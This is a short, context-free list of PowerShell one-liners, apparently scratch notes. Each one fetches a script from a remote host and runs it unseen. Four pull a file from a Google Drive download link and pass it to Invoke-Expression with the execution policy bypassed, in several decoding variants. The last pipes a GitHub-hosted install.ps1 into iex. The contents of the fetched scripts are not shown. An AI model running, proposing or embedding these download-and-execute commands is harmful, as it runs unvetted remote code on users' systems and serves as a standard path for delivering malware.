https://drive.usercontent.google.com/download?id=14knAkeGYw1OQsMtZjoI-q8i-VLY0MW_n&export=download&authuser=0&confirm=t&uuid=7b2ef012-c373-4214-8c69-f4f47f884133&at=AN_67v39eucwOzqjfmjmt3acjEml%3A1729537284648


powershell -ExecutionPolicy Bypass -Command "& {Invoke-Expression (Invoke-WebRequest -Uri 'https://drive.usercontent.google.com/download?id=14knAkeGYw1OQsMtZjoI-q8i-VLY0MW_n&export=download&authuser=0&confirm=t&uuid=7b2ef012-c373-4214-8c69-f4f47f884133&at=AN_67v39eucwOzqjfmjmt3acjEml%3A1729537284648').Content}"


powershell -ExecutionPolicy Bypass -Command "& {Invoke-Expression ((Invoke-WebRequest -Uri 'https://drive.usercontent.google.com/download?id=14knAkeGYw1OQsMtZjoI-q8i-VLY0MW_n&export=download&authuser=0&confirm=t&uuid=7b2ef012-c373-4214-8c69-f4f47f884133&at=AN_67v39eucwOzqjfmjmt3acjEml%3A1729537284648').Content -as [string])}"




powershell -ExecutionPolicy Bypass -Command "& {$response = Invoke-WebRequest -Uri 'https://drive.usercontent.google.com/download?id=14knAkeGYw1OQsMtZjoI-q8i-VLY0MW_n&export=download&authuser=0&confirm=t&uuid=7b2ef012-c373-4214-8c69-f4f47f884133&at=AN_67v39eucwOzqjfmjmt3acjEml%3A1729537284648'; $script = [System.Text.Encoding]::UTF8.GetString($response.Content); Invoke-Expression $script}"


powershell -ExecutionPolicy Bypass -Command "& {$response = Invoke-WebRequest -Uri 'https://drive.usercontent.google.com/download?id=14knAkeGYw1OQsMtZjoI-q8i-VLY0MW_n&export=download&authuser=0&confirm=t&uuid=7b2ef012-c373-4214-8c69-f4f47f884133&at=AN_67v39eucwOzqjfmjmt3acjEml%3A1729537284648';$script = [System.Text.Encoding]::ASCII.GetString($response.Content);Invoke-Expression $script}"


powershell -ExecutionPolicy Bypass -Command "& {iwr https://github.com/Javihache/BMA-Agent/raw/refs/heads/main/install.ps1 -UseBasicParsing | iex}"
